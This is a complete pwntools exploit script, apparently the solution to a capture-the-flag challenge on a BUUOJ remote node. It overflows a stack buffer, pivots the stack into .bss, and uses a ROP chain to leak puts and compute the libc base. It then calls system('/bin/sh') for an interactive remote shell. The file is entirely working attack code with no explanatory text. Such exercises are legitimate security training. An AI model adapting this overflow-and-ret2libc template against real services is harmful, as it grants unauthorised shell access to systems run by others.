#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

context(os = 'linux',arch = 'amd64',log_level = 'debug')

file_name = './pwn'
lib_name = './libc.so.6'
debug = 0
if debug:
    p = process(file_name)
    context.terminal = ['tmux','splitw','-h']
    gdb.attach(p)
else:
    ip = 'node5.buuoj.cn'
    port = '26284'
    p = remote(ip, port)
elf = ELF(file_name)
rop = ROP(file_name)
libc = ELF(lib_name)

main_addr = 0x4011f3
leave_ret = 0x401227
ret = 0x401228
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rbp = rop.find_gadget(['pop rbp', 'ret'])[0]
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
bss = 0x404800

offset = 88
payload = b''
payload += payload.ljust(offset-8, b'A')
payload += p64(bss)
payload += p64(main_addr)

p.recvuntil(b'just chat with me:')
p.send(payload)

payload = b''
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rbp)
payload += p64(bss + 0x100)
payload += p64(main_addr)
payload = payload.ljust(0x50, b'B')
payload += p64(bss-0x50)
payload += p64(leave_ret)
p.recvuntil(b'just chat with me:')
p.send(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc.address = puts_addr - libc.sym['puts']
syscall = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
success(f'libc.address: {hex(libc.address)}')

payload = b'c' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(syscall)
payload = payload.ljust(offset-8, b'C')
payload += p64(bss + 0x100 - 0x50)
payload += p64(leave_ret)
p.recvuntil(b'just chat with me:')
p.send(payload)


p.interactive()

